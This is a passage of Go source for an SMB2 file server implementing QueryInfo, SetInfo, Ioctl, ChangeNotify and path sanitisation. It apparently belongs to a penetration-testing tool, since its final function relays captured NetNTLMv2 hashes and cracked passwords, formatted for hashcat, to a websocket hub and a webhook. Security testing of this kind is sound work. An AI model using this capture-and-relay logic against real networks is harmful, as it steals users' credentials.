	case 37: // FILE_ID_BOTH_DIR_INFORMATION
		return 104
	case 38: // FILE_ID_FULL_DIRECTORY_INFORMATION
		return 80
	default:
		return 68 // safe fallback — class 2 is most common
	}
}

// buildDirEntry builds a FILE_BOTH_DIR_INFORMATION entry for a single file.
func buildDirEntry(name string, fi os.FileInfo, isDir bool, infoClass uint8) []byte {
	nameUTF16 := toUTF16LE(name)
	fixedLen := fixedHeaderLen(infoClass)
	entryLen := align8(fixedLen + len(nameUTF16))
	entry := make([]byte, entryLen)

	// NextEntryOffset (4): set by caller
	// FileIndex (4): 0
	mod := fi.ModTime()
	putWinTime(entry, 8, mod)  // CreationTime
	putWinTime(entry, 16, mod) // LastAccessTime
	putWinTime(entry, 24, mod) // LastWriteTime
	putWinTime(entry, 32, mod) // ChangeTime

	if isDir {
		putle32(entry, 56, FILE_ATTRIBUTE_DIRECTORY)
	} else {
		size := uint64(fi.Size())
		alloc := ((size + 4095) / 4096) * 4096
		putle64(entry, 40, size)  // EndOfFile offset 40
		putle64(entry, 48, alloc) // AllocationSize offset 48
		putle32(entry, 56, FILE_ATTRIBUTE_ARCHIVE)
	}

	putle32(entry, 60, uint32(len(nameUTF16))) // FileNameLength
	// EaSize (4), ShortNameLength (1), Reserved (1), ShortName (24): all 0
	copy(entry[fixedLen:], nameUTF16)
	return entry
}

// ── SMB2 QueryInfo ─────────────────────────────────────────────────────────

func (s *SMBServer) handleQueryInfo(cs *connState, h *smb2Hdr, buf []byte) []byte {
	if len(buf) < 64+40 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]

	infoType := body[2]
	infoClass := body[3]
	outMax := int(le32(body, 4))
	hID := fileIDFromBuf(body, 24)

	if outMax < 64 {
		outMax = 64 * 1024
	}

	handle := cs.getHandle(hID)
	if handle == nil {
		logger.Debugf("SMB: QUERY_INFO nil handle hID=%d infoType=%d infoClass=%d", hID, infoType, infoClass)
		return errResp(h, STATUS_INVALID_PARAMETER)
	}

	// Named pipes have no filesystem path; return stub info without os.Stat.
	if handle.IsPipe {
		var info []byte
		switch infoType {
		case SMB2_0_INFO_FILE:
			switch infoClass {
			case FileBasicInformation:
				info = make([]byte, 40) // all zeros: timestamps + attributes
			case FileStandardInformation:
				info = make([]byte, 24) // zeros: sizes + flags
			case FileInternalInformation:
				info = make([]byte, 8)
			case FileEaInformation:
				info = make([]byte, 4)
			case FileAccessInformation:
				info = make([]byte, 4)
				putle32(info, 0, handle.AccessMask)
			case FilePositionInformation:
				info = make([]byte, 8)
			case FileModeInformation:
				info = make([]byte, 4)
			case FileAllInformation:
				info = make([]byte, 104)             // fixed-size stub
				putle32(info, 56, handle.AccessMask) // AccessInformation.AccessFlags
			case FileNameInformation:
				nameUTF16 := toUTF16LE(filepath.Base(handle.Path))
				info = make([]byte, 4+len(nameUTF16))
				putle32(info, 0, uint32(len(nameUTF16)))
				copy(info[4:], nameUTF16)
			default:
				return errResp(h, STATUS_NOT_SUPPORTED)
			}
		default:
			return errResp(h, STATUS_NOT_SUPPORTED)
		}
		body2 := make([]byte, 8)
		putle16(body2, 0, 9) // StructureSize
		putle16(body2, 2, 0) // OutputBufferOffset = 0 (relative to resp start; set below)
		putle32(body2, 4, uint32(len(info)))
		resp := make([]byte, 64+len(body2)+len(info))
		copy(resp, buildRespHdr(SMB2_QUERY_INFO, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
		copy(resp[64:], body2)
		// OutputBufferOffset: offset from start of SMB2 header
		putle16(resp[64:], 2, uint16(64+len(body2)))
		copy(resp[64+len(body2):], info)
		return resp
	}

	fi, err := os.Stat(handle.Path)
	if err != nil {
		return errResp(h, STATUS_OBJECT_NAME_NOT_FOUND)
	}

	var info []byte

	switch infoType {
	case SMB2_0_INFO_FILE:
		switch infoClass {
		case FileBasicInformation:
			info = buildFileBasicInfo(fi)
		case FileStandardInformation:
			info = buildFileStandardInfo(fi)
		case FileInternalInformation:
			info = make([]byte, 8)
			putle64(info, 0, inodeNumber(fi))
		case FileEaInformation:
			info = make([]byte, 4) // EaSize = 0
		case FileAccessInformation:
			info = make([]byte, 4)
			putle32(info, 0, handle.AccessMask)
		case FilePositionInformation:
			info = make([]byte, 8) // CurrentByteOffset = 0
		case FileModeInformation:
			info = make([]byte, 4) // Mode = 0
		case FileAllInformation:
			info = buildFileAllInfo(fi, handle)
		case FileNetworkOpenInformation:
			info = buildFileNetworkOpenInfo(fi)
		case FileNameInformation:
			nameUTF16 := toUTF16LE(filepath.Base(handle.Path))
			info = make([]byte, 4+len(nameUTF16))
			putle32(info, 0, uint32(len(nameUTF16)))
			copy(info[4:], nameUTF16)
		case FileStreamInformation:
			// No alternate data streams — return a single unnamed stream
			info = buildStreamInfo(fi)
		default:
			logger.Debugf("SMB: QUERY_INFO unhandled file info class=%d (0x%02X)", infoClass, infoClass)
			return errResp(h, STATUS_NOT_SUPPORTED)
		}

	case SMB2_0_INFO_FILESYSTEM:
		tree := cs.getTree(h.TreeID)
		if tree == nil {
			return errResp(h, STATUS_BAD_NETWORK_NAME)
		}
		switch infoClass {
		case FileFsVolumeInformation:
			info = buildFsVolumeInfo(s.ShareName)
		case FileFsSizeInformation:
			info = buildFsSizeInfo(tree.RootPath)
		case FileFsFullSizeInformation:
			info = buildFsFullSizeInfo(tree.RootPath)
		case FileFsDeviceInformation:
			info = make([]byte, 8)
			putle32(info, 0, 7)  // FILE_DEVICE_DISK
			putle32(info, 4, 32) // FILE_REMOTE_DEVICE
		case FileFsAttributeInformation:
			info = buildFsAttributeInfo()
		case FileFsObjectIdInformation: // 8
			// FILE_FS_OBJECTID_INFORMATION: ObjectId(16) + ExtendedInfo(48) = 64 bytes
			info = make([]byte, 64)
		default:
			return errResp(h, STATUS_NOT_SUPPORTED)
		}

	case SMB2_0_INFO_SECURITY:
		// Return a minimal security descriptor — WORLD:R for simplicity
		info = minimalSecurityDescriptor()

	default:
		logger.Debugf("SMB: QUERY_INFO unhandled infoType=%d (0x%02X) infoClass=%d (0x%02X)", infoType, infoType, infoClass, infoClass)
		return errResp(h, STATUS_NOT_SUPPORTED)
	}

	if len(info) > outMax {
		info = info[:outMax]
	}

	respBody := make([]byte, 8+len(info))
	putle16(respBody, 0, 9)
	putle16(respBody, 2, 64+8) // OutputBufferOffset
	putle32(respBody, 4, uint32(len(info)))
	copy(respBody[8:], info)

	resp := make([]byte, 64+len(respBody))
	copy(resp, buildRespHdr(SMB2_QUERY_INFO, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], respBody)
	return resp
}

// ── QueryInfo builders ─────────────────────────────────────────────────────

func buildFileBasicInfo(fi os.FileInfo) []byte {
	info := make([]byte, 40)
	mod := fi.ModTime()
	putWinTime(info, 0, mod)  // CreationTime
	putWinTime(info, 8, mod)  // LastAccessTime
	putWinTime(info, 16, mod) // LastWriteTime
	putWinTime(info, 24, mod) // ChangeTime
	if fi.IsDir() {
		putle32(info, 32, FILE_ATTRIBUTE_DIRECTORY)
	} else {
		putle32(info, 32, FILE_ATTRIBUTE_ARCHIVE)
	}
	return info
}

func buildFileStandardInfo(fi os.FileInfo) []byte {
	info := make([]byte, 24)
	if fi.IsDir() {
		putle64(info, 0, 0)  // AllocationSize
		putle64(info, 8, 0)  // EndOfFile
		putle32(info, 16, 1) // NumberOfLinks
		info[21] = 1         // Directory = true
	} else {
		size := uint64(fi.Size())
		alloc := ((size + 4095) / 4096) * 4096
		putle64(info, 0, alloc)
		putle64(info, 8, size)
		putle32(info, 16, 1) // NumberOfLinks
	}
	return info
}

func buildFileAllInfo(fi os.FileInfo, handle *smbHandle) []byte {
	basic := buildFileBasicInfo(fi)  // 40
	std := buildFileStandardInfo(fi) // 24
	internal := make([]byte, 8)      // FileInternalInformation: 8
	putle64(internal, 0, inodeNumber(fi))
	ea := make([]byte, 4)     // FileEaInformation: 4
	access := make([]byte, 4) // FileAccessInformation: 4
	putle32(access, 0, handle.AccessMask)
	pos := make([]byte, 8)   // FilePositionInformation: 8
	mode := make([]byte, 4)  // FileModeInformation: 4
	align := make([]byte, 4) // FileAlignmentInformation: 4
	nameUTF16 := toUTF16LE(filepath.Base(handle.Path))
	name := make([]byte, 4+len(nameUTF16)) // FileNameInformation
	putle32(name, 0, uint32(len(nameUTF16)))
	copy(name[4:], nameUTF16)

	var all []byte
	all = append(all, basic...)
	all = append(all, std...)
	all = append(all, internal...)
	all = append(all, ea...)
	all = append(all, access...)
	all = append(all, pos...)
	all = append(all, mode...)
	all = append(all, align...)
	all = append(all, name...)
	return all
}

func buildFileNetworkOpenInfo(fi os.FileInfo) []byte {
	info := make([]byte, 56)
	mod := fi.ModTime()
	putWinTime(info, 0, mod)
	putWinTime(info, 8, mod)
	putWinTime(info, 16, mod)
	putWinTime(info, 24, mod)
	if !fi.IsDir() {
		size := uint64(fi.Size())
		alloc := ((size + 4095) / 4096) * 4096
		putle64(info, 32, alloc)
		putle64(info, 40, size)
		putle32(info, 48, FILE_ATTRIBUTE_ARCHIVE)
	} else {
		putle32(info, 48, FILE_ATTRIBUTE_DIRECTORY)
	}
	return info
}

func buildStreamInfo(fi os.FileInfo) []byte {
	// Single unnamed stream for a regular file
	if fi.IsDir() {
		return make([]byte, 8) // empty
	}
	// StreamName: "::$DATA" in UTF-16LE
	streamName := toUTF16LE("::$DATA")
	size := uint64(fi.Size())
	alloc := ((size + 4095) / 4096) * 4096
	entry := make([]byte, 4+4+8+8+len(streamName))
	// NextEntryOffset = 0
	putle32(entry, 4, uint32(len(streamName))) // StreamNameLength
	putle64(entry, 8, size)                    // StreamSize
	putle64(entry, 16, alloc)                  // StreamAllocationSize
	copy(entry[24:], streamName)
	return entry
}

func buildFsVolumeInfo(label string) []byte {
	labelUTF16 := toUTF16LE(label)
	info := make([]byte, 18+len(labelUTF16))
	// VolumeCreationTime: 0
	putle32(info, 8, 0x12345678)               // VolumeSerialNumber
	putle32(info, 12, uint32(len(labelUTF16))) // VolumeLabelLength
	// SupportsObjects = 0
	copy(info[18:], labelUTF16)
	return info
}

func buildFsSizeInfo(root string) []byte {
	info := make([]byte, 24)
	total, free := diskSpace(root)
	const clusterSize = 4096
	putle64(info, 0, total/clusterSize) // TotalAllocationUnits
	putle64(info, 8, free/clusterSize)  // AvailableAllocationUnits
	putle32(info, 16, 1)                // SectorsPerAllocationUnit
	putle32(info, 20, clusterSize)      // BytesPerSector
	return info
}

func buildFsFullSizeInfo(root string) []byte {
	info := make([]byte, 32)
	total, free, callerFree := diskSpaceFull(root)
	const clusterSize = 4096
	putle64(info, 0, total/clusterSize)
	putle64(info, 8, callerFree/clusterSize)
	putle64(info, 16, free/clusterSize)
	putle32(info, 24, 1)
	putle32(info, 28, clusterSize)
	return info
}

func buildFsAttributeInfo() []byte {
	fsName := toUTF16LE("NTFS")
	info := make([]byte, 12+len(fsName))
	// Advertise a realistic NTFS attribute set.
	//   0x00000001  FILE_CASE_SENSITIVE_SEARCH
	//   0x00000002  FILE_CASE_PRESERVED_NAMES
	//   0x00000004  FILE_UNICODE_ON_DISK         — required for Unicode rename in Explorer
	//   0x00000008  FILE_PERSISTENT_ACLS
	//   0x00040000  FILE_NAMED_STREAMS           — we handle ADS with null-sink already
	const fsAttrs uint32 = 0x0004000F
	putle32(info, 0, fsAttrs)
	putle32(info, 4, 255) // MaximumComponentNameLength
	putle32(info, 8, uint32(len(fsName)))
	copy(info[12:], fsName)
	return info
}

func minimalSecurityDescriptor() []byte {
	// Minimal self-relative SD with no DACL (everyone has access)
	sd := make([]byte, 20)
	sd[0] = 1              // Revision
	sd[1] = 0              // Sbz1
	putle16(sd, 2, 0x8004) // Control: SE_SELF_RELATIVE | SE_DACL_PRESENT
	return sd
}

// ── SMB2 SetInfo ───────────────────────────────────────────────────────────

func (s *SMBServer) handleSetInfo(cs *connState, h *smb2Hdr, buf []byte) []byte {
	if s.ReadOnly {
		return errResp(h, STATUS_ACCESS_DENIED)
	}
	if len(buf) < 64+32 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]

	infoType := body[2]
	infoClass := body[3]
	bufLen := int(le32(body, 4))
	bufOff := int(le16(body, 8))
	hID := fileIDFromBuf(body, 16)

	if bufOff+bufLen > len(buf) {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	infoBuf := buf[bufOff : bufOff+bufLen]

	handle := cs.getHandle(hID)
	if handle == nil {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}

	if infoType == SMB2_0_INFO_FILE {
		switch infoClass {
		case FileBasicInformation:
			// 40-byte structure: CreationTime(8), LastAccessTime(8), LastWriteTime(8),
			// ChangeTime(8), FileAttributes(4), Reserved(4). Zero means "no change".
			if len(infoBuf) < 40 || handle.IsDir || handle.File == nil {
				break
			}
			atime := fromWinTime(le64(infoBuf, 8))
			mtime := fromWinTime(le64(infoBuf, 16))
			if !atime.IsZero() || !mtime.IsZero() {
				cur, err := os.Stat(handle.Path)
				if err != nil {
					return errResp(h, STATUS_ACCESS_DENIED)
				}
				if atime.IsZero() {
					atime = cur.ModTime()
				}
				if mtime.IsZero() {
					mtime = cur.ModTime()
				}
				_ = os.Chtimes(handle.Path, atime, mtime)
			}

		case FileAllocationInformation:
			// 8-byte structure: AllocationSize(8). Truncate to the requested size.
			if len(infoBuf) < 8 || handle.File == nil {
				return errResp(h, STATUS_INVALID_PARAMETER)
			}
			// NO-DELETE / UPLOAD-ONLY: Truncate shrinks a pre-existing file,
			// destroying content. Refuse it for protected served files.
			if s.protectExisting(handle.Path) {
				logger.Debugf("SMB: SET_INFO FileAllocation denied (no-delete/upload-only) %s", handle.Path)
				return errResp(h, STATUS_ACCESS_DENIED)
			}
			allocSize := int64(le64(infoBuf, 0))
			if err := handle.File.Truncate(allocSize); err != nil {
				return errResp(h, STATUS_ACCESS_DENIED)
			}

		case FileDispositionInformation:
			if len(infoBuf) >= 1 && infoBuf[0] != 0 {
				if s.UploadOnly || s.NoDelete {
					logger.Debugf("SMB: SET_INFO FileDisposition denied (delete not allowed) %s", handle.Path)
					return errResp(h, STATUS_ACCESS_DENIED)
				}
				if handle.IsDir {
					entries, err := os.ReadDir(handle.Path)
					if err != nil {
						return errResp(h, STATUS_ACCESS_DENIED)
					}
					if len(entries) > 0 {
						return errResp(h, STATUS_DIRECTORY_NOT_EMPTY)
					}
				}
				handle.DeleteOnClose = true
			}

		case FileRenameInformation:
			// Rename is a deletion-class operation: it moves a file out of its
			// path (move-as-deletion) and can clobber the destination. Under
			// --upload-only or --no-delete only allow renaming items created in
			// this session. Windows uses a fresh FILE_OPEN handle for the rename,
			// so we check newlyCreatedPaths (path map) rather than the handle.
			if s.UploadOnly || s.NoDelete {
				if _, ok := s.newlyCreatedPaths.Load(handle.Path); !ok {
					logger.Debugf("SMB: SET_INFO FileRename denied (no-delete/upload-only, pre-existing item) %s", handle.Path)
					return errResp(h, STATUS_ACCESS_DENIED)
				}
			}
			if len(infoBuf) < 20 {
				return errResp(h, STATUS_INVALID_PARAMETER)
			}
			nameLen := int(le32(infoBuf, 16))
			if 20+nameLen > len(infoBuf) {
				return errResp(h, STATUS_INVALID_PARAMETER)
			}
			newName := fromUTF16LE(infoBuf[20 : 20+nameLen])
			newName = strings.ReplaceAll(newName, "\\", string(filepath.Separator))
			tree := cs.getTree(h.TreeID)
			if tree == nil {
				return errResp(h, STATUS_BAD_NETWORK_NAME)
			}
			newPath, err := s.safePath(tree.RootPath, newName)
			if err != nil {
				return errResp(h, STATUS_ACCESS_DENIED)
			}
			oldPath := handle.Path
			// NO-DELETE / UPLOAD-ONLY: os.Rename silently clobbers an existing
			// destination, destroying that file's contents. Refuse to overwrite a
			// protected pre-existing destination.
			if s.protectExisting(newPath) {
				if _, statErr := os.Stat(newPath); statErr == nil {
					logger.Debugf("SMB: SET_INFO FileRename denied (no-delete/upload-only, destination exists) %s", newPath)
					return errResp(h, STATUS_OBJECT_NAME_COLLISION)
				}
			}
			if err := os.Rename(oldPath, newPath); err != nil {
				return errResp(h, STATUS_ACCESS_DENIED)
			}
			// Update newlyCreatedPaths: the old path no longer exists; the new
			// path is still a newly-created item so future renames of it are allowed.
			s.newlyCreatedPaths.Delete(oldPath)
			s.newlyCreatedPaths.Store(newPath, struct{}{})
			handle.Path = newPath

		case FileEndOfFileInformation:
			if len(infoBuf) < 8 || handle.File == nil {
				return errResp(h, STATUS_INVALID_PARAMETER)
			}
			// NO-DELETE / UPLOAD-ONLY: setting EOF truncates a pre-existing file,
			// destroying content. Refuse it for protected served files.
			if s.protectExisting(handle.Path) {
				logger.Debugf("SMB: SET_INFO FileEndOfFile denied (no-delete/upload-only) %s", handle.Path)
				return errResp(h, STATUS_ACCESS_DENIED)
			}
			newSize := int64(le64(infoBuf, 0))
			if err := handle.File.Truncate(newSize); err != nil {
				return errResp(h, STATUS_ACCESS_DENIED)
			}

		default:
			// Silently ignore other set info requests
		}
	}

	body2 := make([]byte, 2)
	putle16(body2, 0, 2) // StructureSize
	resp := make([]byte, 64+2)
	copy(resp, buildRespHdr(SMB2_SET_INFO, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], body2)
	return resp
}

// ── SMB2 Lock ──────────────────────────────────────────────────────────────

func (s *SMBServer) handleLock(cs *connState, h *smb2Hdr, buf []byte) []byte {
	// SMB2 LOCK request body starts at offset 64.
	// StructureSize(2) + LockCount(2) + LockSequence(4) + FileId(16) = 24 bytes minimum.
	if len(buf) < 64+24 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]
	lockCount := int(le16(body, 2))
	hID := fileIDFromBuf(body, 8)
	handle := cs.getHandle(hID)
	if handle == nil {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	// Each lock element is 24 bytes: Offset(8) + Length(8) + Flags(4) + Reserved(4).
	if len(body) < 24+lockCount*24 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	// Advisory locks only — no kernel enforcement. Always succeed.
	logger.Debugf("SMB: LOCK fileID=%d lockCount=%d (advisory, no enforcement)", hID, lockCount)

	// Response: StructureSize(2)=4, Reserved(2)=0.
	resp := make([]byte, 64+4)
	copy(resp, buildRespHdr(SMB2_LOCK, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	putle16(resp, 64, 4)
	return resp
}

// ── SMB2 Ioctl ─────────────────────────────────────────────────────────────

func (s *SMBServer) handleIoctl(cs *connState, h *smb2Hdr, buf []byte) []byte {
	if len(buf) < 64+56 {
		return errResp(h, STATUS_INVALID_PARAMETER)
	}
	body := buf[64:]
	ctlCode := le32(body, 4)

	// Extract FileId and Flags from request so we can echo them back (MS-SMB2 3.3.5.14).
	var reqFileID [16]byte
	copy(reqFileID[:], body[8:24])
	reqFlags := le32(body, 40)

	logger.Debugf("SMB: IOCTL ctlCode=0x%08X treeID=%d", ctlCode, h.TreeID)

	switch ctlCode {
	case FSCTL_VALIDATE_NEGOTIATE_INFO:
		// Reply with our negotiate parameters so Windows can verify there was no MITM.
		// SecurityMode must match what we sent in NEGOTIATE: always 0x0001
		// (SMB2_NEGOTIATE_SIGNING_ENABLED), same as Samba does for all share types.
		out := make([]byte, 24)
		putle32(out, 0, SMB2_GLOBAL_CAP_LARGE_MTU) // Capabilities
		copy(out[4:], s.serverGUID[:])             // Guid
		putle16(out, 20, 0x0001)                   // SecurityMode = SIGNING_ENABLED
		putle16(out, 22, SMB2_DIALECT_210)         // DialectRevision
		return s.buildIoctlResp(h, ctlCode, reqFileID, reqFlags, nil, out)

	case FSCTL_PIPE_WAIT:
		// Windows sends this to check if a named pipe is available.
		// Return success to indicate the pipe exists and is ready.
		return s.buildIoctlResp(h, ctlCode, reqFileID, reqFlags, nil, nil)

	case FSCTL_PIPE_PEEK:
		// Windows may peek at pipe state. Return success with no data.
		return s.buildIoctlResp(h, ctlCode, reqFileID, reqFlags, nil, nil)

	case FSCTL_CREATE_OR_GET_OBJECT_ID:
		// FILE_OBJECTID_BUFFER: ObjectId(16) + BirthVolumeId(16) + BirthObjectId(16) + DomainId(16)
		out := make([]byte, 64)
		return s.buildIoctlResp(h, ctlCode, reqFileID, reqFlags, nil, out)

	case FSCTL_DFS_GET_REFERRALS:
		// STATUS_FS_DRIVER_REQUIRED (Samba's approach) tells Windows "DFS is not
		// available on this server" so it immediately falls back to direct share
		// access without retrying. STATUS_OBJECT_NAME_NOT_FOUND causes Explorer
		// to loop retrying DFS resolution and never list share contents.
		return errResp(h, STATUS_FS_DRIVER_REQUIRED)

	case FSCTL_PIPE_TRANSCEIVE: // 0x0011C017
		inputOff := int(le32(body, 24)) // InputOffset (from start of SMB2 header)
		inputLen := int(le32(body, 28)) // InputCount
		hID := fileIDFromBuf(body, 8)
		if inputOff+inputLen > len(buf) {
			return errResp(h, STATUS_INVALID_PARAMETER)
		}
		handle := cs.getHandle(hID)
		if handle == nil || !handle.IsPipe {
			return errResp(h, STATUS_INVALID_PARAMETER)
		}
		out := s.handlePipeWrite(handle, buf[inputOff:inputOff+inputLen])
		if out == nil {
			out = []byte{}
		}
		return s.buildIoctlResp(h, ctlCode, reqFileID, reqFlags, nil, out)
	default:
		logger.Debugf("SMB: IOCTL unknown ctlCode=0x%08X — returning NOT_SUPPORTED", ctlCode)
		return errResp(h, STATUS_NOT_SUPPORTED)
	}
}

func (s *SMBServer) buildIoctlResp(h *smb2Hdr, ctlCode uint32, fileID [16]byte, flags uint32, in, out []byte) []byte {
	// Body: StructureSize(2) + Reserved(2) + CtlCode(4) + FileId(16) +
	//       InputOffset(4) + InputCount(4) + OutputOffset(4) + OutputCount(4) +
	//       Flags(4) + Reserved2(4) = 48 bytes
	const bodyFixed = 48
	// MS-SMB2 2.2.33: If no input data is being returned, InputOffset MUST be 0.
	inputOff := uint32(0)
	if len(in) > 0 {
		inputOff = uint32(64 + bodyFixed)
	}
	outputOff := uint32(64+bodyFixed) + uint32(len(in))

	body := make([]byte, bodyFixed+len(in)+len(out))
	putle16(body, 0, 49) // StructureSize
	putle32(body, 4, ctlCode)
	// FileId: copy from request per MS-SMB2 3.3.5.14
	copy(body[8:], fileID[:])
	putle32(body, 24, inputOff)
	putle32(body, 28, uint32(len(in)))
	putle32(body, 32, outputOff)
	putle32(body, 36, uint32(len(out)))
	putle32(body, 40, flags) // Flags: echo request flags (includes SMB2_0_IOCTL_IS_FSCTL)

	if len(in) > 0 {
		copy(body[bodyFixed:], in)
	}
	if len(out) > 0 {
		copy(body[bodyFixed+len(in):], out)
	}

	resp := make([]byte, 64+len(body))
	copy(resp, buildRespHdr(SMB2_IOCTL, STATUS_SUCCESS, h.MessageID, h.TreeID, h.SessionID))
	copy(resp[64:], body)
	return resp
}

// ── SMB2 ChangeNotify ──────────────────────────────────────────────────────

// ── Server-wide CHANGE_NOTIFY management ───────────────────────────────────

// addGlobalWatch stores a pending CHANGE_NOTIFY watch. If a directory change
// already fired before this watch arrived (pendingFire is set), the watch is
// fired immediately. Same-connection watches are deferred into cs.deferredNotifies
// so they are sent AFTER the current command response; cross-connection watches
// are written directly to the target connection.
func (s *SMBServer) addGlobalWatch(cs *connState, n pendingNotify) {
	s.watchMu.Lock()
	if s.pendingFire {
		s.pendingFire = false
		s.watchMu.Unlock()
		n.status = STATUS_NOTIFY_ENUM_DIR
		if n.conn == cs.conn {
			cs.deferredNotifies = append(cs.deferredNotifies, n)
		} else {
			s.sendNotify(n)
		}
		return
	}
	s.watches = append(s.watches, n)
	s.watchMu.Unlock()
}

// fireAllWatches fires every pending CHANGE_NOTIFY watch server-wide. If no
// watches are registered, sets pendingFire so the next watch that arrives fires
// immediately (handles the case where the dir change completes before the client
// sends its next CHANGE_NOTIFY request).
// Same-connection watches are deferred into cs.deferredNotifies so they are
// sent AFTER the current command response, preserving the expected message order.
// Cross-connection watches are written directly to the target connection.
func (s *SMBServer) fireAllWatches(cs *connState) {
	s.watchMu.Lock()
	if len(s.watches) == 0 {
		s.pendingFire = true
		s.watchMu.Unlock()
		return
	}
	fired := s.watches
	s.watches = nil
	s.watchMu.Unlock()

	for _, w := range fired {
		w.status = STATUS_NOTIFY_ENUM_DIR
		if w.conn == cs.conn {
			cs.deferredNotifies = append(cs.deferredNotifies, w)
		} else {
			s.sendNotify(w)
		}
	}
}

// cancelGlobalWatch removes the watch with the given msgID registered on conn
// and sends a STATUS_CANCELLED response for it.
func (s *SMBServer) cancelGlobalWatch(msgID uint64, conn net.Conn) {
	s.watchMu.Lock()
	for i, w := range s.watches {
		if w.msgID == msgID && w.conn == conn {
			s.watches = append(s.watches[:i], s.watches[i+1:]...)
			s.watchMu.Unlock()
			w.status = STATUS_CANCELLED
			s.sendNotify(w)
			return
		}
	}
	s.watchMu.Unlock()
}

// removeConnWatches silently removes all pending watches for a closing connection.
// No responses are sent — the connection is already torn down.
func (s *SMBServer) removeConnWatches(conn net.Conn) {
	s.watchMu.Lock()
	keep := s.watches[:0]
	for _, w := range s.watches {
		if w.conn != conn {
			keep = append(keep, w)
		}
	}
	s.watches = keep
	s.watchMu.Unlock()
}

// sendNotify builds a CHANGE_NOTIFY response, signs it if needed, and writes
// it to the watch's connection as a standalone NetBIOS frame.
// Go's net.Conn is goroutine-safe; concurrent writes from different goroutines
// are serialized by the runtime without interleaving.
func (s *SMBServer) sendNotify(n pendingNotify) {
	resp := buildNotifyResp(n)
	if sess := s.getSession(n.sessID); sess != nil {
		sess.mu.RLock()
		sk := sess.SigningKey
		sess.mu.RUnlock()
		if len(sk) == 16 {
			SignSMB2Response(sk, resp)
		}
	}
	// Ignore write errors — the connection may have closed already.
	n.conn.Write(wrapNetBIOS(resp)) //nolint:errcheck
}

// handleChangeNotify holds SMB2 CHANGE_NOTIFY requests rather than responding
// immediately. Responding immediately causes Windows to re-issue the request
// in a tight loop, starving all other operations. Instead we store the watch
// server-wide and fire it (STATUS_NOTIFY_ENUM_DIR) when a file-modifying
// operation completes on any connection (see handleClose → fireAllWatches).
func (s *SMBServer) handleChangeNotify(cs *connState, h *smb2Hdr) []byte {
	s.addGlobalWatch(cs, pendingNotify{
		msgID:  h.MessageID,
		treeID: h.TreeID,
		sessID: h.SessionID,
		conn:   cs.conn,
	})
	return nil // no immediate response — held until a dir change fires it
}

// buildNotifyResp builds a CHANGE_NOTIFY response for a fired/cancelled watch.
func buildNotifyResp(n pendingNotify) []byte {
	body := make([]byte, 8)
	putle16(body, 0, 9) // StructureSize
	// OutputBufferOffset and OutputBufferLength remain 0
	resp := make([]byte, 64+8)
	copy(resp, buildRespHdr(SMB2_CHANGE_NOTIFY, n.status, n.msgID, n.treeID, n.sessID))
	copy(resp[64:], body)
	return resp
}

// ── SMB2 Echo ──────────────────────────────────────────────────────────────

func (s *SMBServer) handleEcho(h *smb2Hdr) []byte {
	body := make([]byte, 4)
	putle16(body, 0, 4)
	resp := make([]byte, 64+4)
	copy(resp, buildRespHdr(SMB2_ECHO, STATUS_SUCCESS, h.MessageID, 0, 0))
	copy(resp[64:], body)
	return resp
}

// ── Path sanitization ──────────────────────────────────────────────────────

// safePath joins root and relPath and ensures the result stays within root.
func (s *SMBServer) safePath(root, relPath string) (string, error) {
	// Normalize Windows-style separators
	relPath = strings.ReplaceAll(relPath, "\\", string(filepath.Separator))
	relPath = strings.TrimPrefix(relPath, string(filepath.Separator))

	if relPath == "" || relPath == "." {
		return root, nil
	}

	abs := filepath.Join(root, filepath.Clean(relPath))

	// Prevent directory traversal
	rootClean := filepath.Clean(root)
	if !strings.HasPrefix(abs, rootClean+string(filepath.Separator)) && abs != rootClean {
		return "", fmt.Errorf("path escape attempt: %s", relPath)
	}
	return abs, nil
}

// ── Disk space helpers ─────────────────────────────────────────────────────

// These use a fixed generous estimate on platforms where syscall is unavailable.
// On Linux, replace with syscall.Statfs for accurate values.
func diskSpace(path string) (total, free uint64) {
	if st, err := statfs(path); err == nil {
		return st.total, st.free
	}
	return 100 * 1024 * 1024 * 1024, 50 * 1024 * 1024 * 1024
}

func diskSpaceFull(path string) (total, free, callerFree uint64) {
	t, f := diskSpace(path)
	return t, f, f
}

// ── WebSocket broadcast ────────────────────────────────────────────────────

func (s *SMBServer) broadcastNTLMEvent(c *CapturedHash, source, crackedPassword string) {
	if s.Hub == nil {
		return
	}
	hashType := string(c.Protocol)
	if hashType == "" {
		hashType = "NetNTLMv2"
	}
	hashcatMode := c.HashcatMode
	if hashcatMode == "" {
		hashcatMode = "5600"
	}
	event := ws.NTLMEvent{
		Type:            "smb",
		Username:        c.Username,
		Domain:          c.Domain,
		Workstation:     c.Workstation,
		Challenge:       fmt.Sprintf("%X", c.ServerChallenge),
		Hash:            c.HashcatLine,
		HashType:        hashType,
		HashcatMode:     hashcatMode,
		CrackedPassword: crackedPassword,
		Source:          source,
		Timestamp:       time.Now(),
	}
	b, err := json.Marshal(event)
	if err != nil {
		return
	}
	s.Hub.Broadcast <- b

	if s.WebHook != nil {
		msg := fmt.Sprintf(
			"User: %s\nDomain: %s\nWorkstation: %s\nSource: %s\nHash Type: %s\nHashcat Mode: hashcat -m %s",
			c.Username, c.Domain, c.Workstation, source, hashType, hashcatMode,
		)
		if crackedPassword != "" {
			msg = fmt.Sprintf("%s\nCracked: %s", msg, crackedPassword)
		}
		msg = fmt.Sprintf("%s\n\n%s", msg, c.HashcatLine)
		logger.HandleWebhookSend(msg, "smb", *s.WebHook)
	}
}
